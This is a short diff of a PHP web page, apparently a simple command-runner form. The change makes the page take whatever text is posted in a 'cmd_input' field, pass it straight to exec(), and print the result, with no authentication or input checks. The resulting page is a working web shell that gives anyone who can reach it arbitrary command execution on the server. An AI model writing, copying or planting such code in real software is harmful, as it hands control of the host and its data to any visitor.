@@ -10,16 +10,9 @@
 <body style="text-align:center;">
 
     <?php
-        if(array_key_exists('cmd_button', $_POST)) {
-            butt();
-        }
-        function butt() {
-
-            echo $_POST["cmd_input"];
-            $output = exec($command);
-
-            echo $output;
-        }
+        $command = $_POST["cmd_input"];
+        $output = exec($command);
+        echo $output;
     ?>
 
     <form method="post">
